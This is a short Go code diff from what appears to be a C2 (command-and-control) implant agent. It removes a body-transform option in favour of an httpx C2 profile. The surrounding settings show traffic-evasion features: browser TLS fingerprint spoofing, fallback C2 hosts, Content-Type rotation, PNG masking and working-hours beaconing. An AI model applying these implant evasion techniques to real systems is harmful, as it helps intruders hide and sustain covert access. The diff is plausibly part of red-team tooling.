@@ -52,7 +52,7 @@ var (
 	tlsFingerprint    string = ""     // TLS ClientHello fingerprint: chrome, firefox, safari, edge, random, go (default)
 	fallbackHosts     string = ""     // Comma-separated fallback C2 URLs for automatic failover
 	contentTypes      string = ""     // Comma-separated Content-Type values for request rotation
-	bodyTransforms    string = ""     // Comma-separated body transform chain (e.g., "gzip,mask:png")
+	// bodyTransforms removed: use httpx C2 profile for malleable transforms
 	workingHoursStart string = ""     // Working hours start (HH:MM, 24hr local time)
 	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
 	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
@@ -365,15 +365,6 @@ func runAgent() {
 				if err := json.Unmarshal(decoded, &headers); err == nil {
 					httpProfile.CustomHeaders = headers
 				}
-			}
-		}
-		// Parse and apply body transforms (malleable C2 Phase 2)
-		if bodyTransforms != "" {
-			chain, err := http.ParseTransformChain(bodyTransforms)
-			if err != nil {
-				log.Printf("body transform parse error: %v", err)
-			} else {
-				httpProfile.Transforms = chain
 			}
 		}
 		c2 = profiles.NewProfile(httpProfile)
